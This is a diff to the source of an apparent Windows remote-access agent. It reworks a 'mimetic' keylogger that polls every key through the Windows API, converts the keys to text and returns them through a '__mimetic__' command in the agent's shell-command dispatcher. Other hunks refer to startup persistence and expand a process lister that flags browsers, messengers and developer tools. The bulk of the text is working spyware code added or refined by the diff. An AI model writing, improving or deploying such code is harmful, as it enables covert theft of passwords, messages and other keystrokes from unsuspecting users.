@@ -263,11 +263,10 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """Capture keyboard input including special characters (ñ, ?, etc) using Windows API."""
-    global mimetic_log, mimetic_finished
-
+    """Capture keyboard indefinitely until ESC or 1 minute inactivity - supports all characters."""
+    log = []
     last_key_time = time.time()
-    inactivity_timeout = 60  # 1 minute of inactivity for auto-stop
+    inactivity_timeout = 60  # 1 minute
 
     try:
         user32 = ctypes.windll.user32
@@ -276,14 +275,13 @@ def mimetic_keylogger():
         ToUnicodeEx = user32.ToUnicodeEx
         GetKeyboardLayout = user32.GetKeyboardLayout
     except Exception:
-        mimetic_finished = True
-        return
+        return "Error: Could not access Windows API"
 
     # Key codes for special keys
     VK_ESCAPE = 0x1B
     key_map = {
         0x20: '[SPACE]', 0x0D: '[ENTER]', 0x09: '[TAB]',
-        0x08: '[BACKSPACE]', 0x2E: '[DELETE]', 0x1B: '[ESC]'
+        0x08: '[BACKSPACE]', 0x2E: '[DELETE]'
     }
 
     try:
@@ -293,9 +291,8 @@ def mimetic_keylogger():
         while True:
             current_time = time.time()
 
-            # Check if we've been inactive for 60 seconds
-            elapsed_inactive = current_time - last_key_time
-            if elapsed_inactive >= inactivity_timeout:
+            # Check if inactive for 60 seconds
+            if current_time - last_key_time >= inactivity_timeout:
                 break
 
             # Check all keys (0-255)
@@ -303,19 +300,19 @@ def mimetic_keylogger():
                 key_state = GetAsyncKeyState(vk_code)
                 is_pressed = bool(key_state & 0x8000)
 
-                # Detect key state change (from not pressed to pressed)
+                # Detect key state change
                 if is_pressed and vk_code not in pressed_keys:
                     pressed_keys.add(vk_code)
                     last_key_time = current_time
 
                     # Check for ESC to exit immediately
                     if vk_code == VK_ESCAPE:
-                        mimetic_finished = True
-                        return
+                        result = ''.join(log)
+                        return result if result else "No keys recorded"
 
                     # Map special keys first
                     if vk_code in key_map:
-                        mimetic_log.append(key_map[vk_code])
+                        log.append(key_map[vk_code])
                     else:
                         # Try to convert virtual key to unicode character
                         try:
@@ -336,28 +333,29 @@ def mimetic_keylogger():
                             if result > 0:
                                 char = result_buffer.value
                                 if char:
-                                    mimetic_log.append(char)
+                                    log.append(char)
                             elif 0x30 <= vk_code <= 0x39:  # Fallback for numbers
-                                mimetic_log.append(chr(vk_code))
+                                log.append(chr(vk_code))
                             elif 0x41 <= vk_code <= 0x5A:  # Fallback for letters
-                                mimetic_log.append(chr(vk_code).lower())
+                                log.append(chr(vk_code).lower())
                         except:
-                            # Fallback to basic mapping if ToUnicodeEx fails
+                            # Fallback to basic mapping
                             if 0x30 <= vk_code <= 0x39:
-                                mimetic_log.append(chr(vk_code))
+                                log.append(chr(vk_code))
                             elif 0x41 <= vk_code <= 0x5A:
-                                mimetic_log.append(chr(vk_code).lower())
+                                log.append(chr(vk_code).lower())
 
                 elif not is_pressed and vk_code in pressed_keys:
                     pressed_keys.discard(vk_code)
 
-            # Small sleep to avoid consuming too much CPU
+            # Sleep to avoid CPU usage
             time.sleep(0.05)
 
-        mimetic_finished = True
+        result = ''.join(log)
+        return result if result else "No keys recorded"
 
-    except Exception:
-        mimetic_finished = True
+    except Exception as e:
+        return f"Error: {str(e)}"
 
 
 def restart_agent():
@@ -683,23 +681,10 @@ def execute_shell_command(cmd_str):
 
         if cmd_lower.startswith("__mimetic__"):
             try:
-                mimetic_active = True
-                mimetic_log = []
-                mimetic_finished = False
-
-                # Start mimetic in background thread
-                threading.Thread(target=mimetic_keylogger, daemon=False).start()
-
-                # Return immediately - frontend will poll for results
-                return "Mimetic started - use __mimetic_get__ to get partial results"
+                result = mimetic_keylogger()
+                return result
             except Exception as e:
                 return f"Error: {str(e)}"
-
-        # Get mimetic partial results
-        if cmd_lower.startswith("__mimetic_get__"):
-            result = ''.join(mimetic_log)
-            status = "FINISHED" if mimetic_finished else "RECORDING"
-            return f"{result}\n[{status}]"
 
         # Handle nano command
         if cmd_lower.startswith("nano "):
@@ -952,48 +937,88 @@ def execute_shell_command(cmd_str):
         # Handle processes command - show running processes (filtered)
         if cmd_lower == "processes":
             try:
-                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=10)
+                # Run tasklist with increased timeout
+                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=15)
                 if not result.stdout:
                     return "No processes running"
 
                 lines = result.stdout.strip().split("\n")
+                if len(lines) < 3:
+                    return "No processes running"
 
-                # Keywords for interesting processes
-                keywords = {
-                    'chrome', 'firefox', 'edge', 'opera', 'safari', 'brave',
-                    'discord', 'telegram', 'slack', 'skype', 'teams',
-                    'spotify', 'vlc', 'audacity', 'winamp',
-                    'code', 'sublime', 'notepad', 'atom', 'vim', 'emacs',
-                    'python', 'node', 'java', 'rust',
-                    'steam', 'epic', 'origin',
-                    'visual studio', 'intellij', 'pycharm',
-                    'blender', 'photoshop', 'illustrator',
-                    'obs', 'twitch', 'youtube',
-                    'git', 'docker', 'putty', 'winscp', '7zip', 'winrar',
-                    'windows agent service', 'telelluc', 'msedgewebview2', 'ms-'
-                }
+                # Keywords for interesting processes - expanded list
+                keywords = [
+                    'chrome', 'firefox', 'edge', 'opera', 'safari', 'brave', 'iexplore',
+                    'discord', 'telegram', 'slack', 'skype', 'teams', 'whatsapp',
+                    'spotify', 'vlc', 'audacity', 'winamp', 'foobar',
+                    'code', 'sublime', 'notepad', 'atom', 'vim', 'emacs', 'gedit',
+                    'python', 'node', 'java', 'rust', 'golang', 'ruby',
+                    'steam', 'epic', 'origin', 'uplay', 'battle',
+                    'visual studio', 'intellij', 'pycharm', 'rider',
+                    'blender', 'photoshop', 'illustrator', 'premiere', 'gimp',
+                    'obs', 'twitch', 'youtube', 'streamlabs',
+                    'git', 'docker', 'putty', 'winscp', '7zip', 'winrar', 'everything',
+                    'windows agent service', 'telelluc', 'msedgewebview2', 'ms-teams', 'msedge', 'ms-edge',
+                    'vscode', 'vs code'
+                ]
 
-                # Header and separator
-                output = "Image Name                     PID\n"
-                output += "=================================================\n"
+                # Header
+                output_lines = ["Image Name                     PID"]
+                output_lines.append("=================================================")
 
-                # Process each line
-                for line in lines[2:]:  # Skip header and separator
+                # Process each line (skip header and separator which are first 2 lines)
+                seen = set()
+                for line in lines[2:]:
                     line = line.strip()
-                    if not line:
+                    if not line or line.startswith('='):
                         continue
 
-                    # Simple check: if line contains any keyword, include it
-                    if any(kw in line.lower() for kw in keywords):
-                        # Extract name (first part) and PID (last number)
-                        parts = line.split()
-                        if len(parts) >= 2:
-                            name = parts[0]
-                            pid = parts[-1]  # Last part is the PID
-                            if pid.isdigit():
-                                output += f"{name:<30} {pid}\n"
+                    line_lower = line.lower()
 
-                return output.strip()
+                    # Check if line contains any keyword
+                    has_keyword = any(kw in line_lower for kw in keywords)
+                    if not has_keyword:
+                        continue
+
+                    # Parse: find last number (PID) and everything before it (name)
+                    parts = line.split()
+                    if len(parts) < 2:
+                        continue
+
+                    # Try to find the PID (last numeric part)
+                    pid = None
+                    pid_idx = -1
+                    for i in range(len(parts) - 1, -1, -1):
+                        if parts[i].isdigit():
+                            pid = parts[i]
+                            pid_idx = i
+                            break
+
+                    if not pid:
+                        continue
+
+                    # Get process name (everything before PID)
+                    name = ' '.join(parts[:pid_idx]) if pid_idx > 0 else parts[0]
+                    if not name:
+                        continue
+
+                    # Avoid duplicates
+                    key = (name.lower(), pid)
+                    if key in seen:
+                        continue
+                    seen.add(key)
+
+                    # Format output
+                    output_lines.append(f"{name:<30} {pid}")
+
+                # Return output
+                if len(output_lines) > 2:
+                    return "\n".join(output_lines[:50])
+                else:
+                    return "No processes found"
+
+            except subprocess.TimeoutExpired:
+                return "Process list timeout - try again"
             except Exception as e:
                 return f"Error: {str(e)}"
 
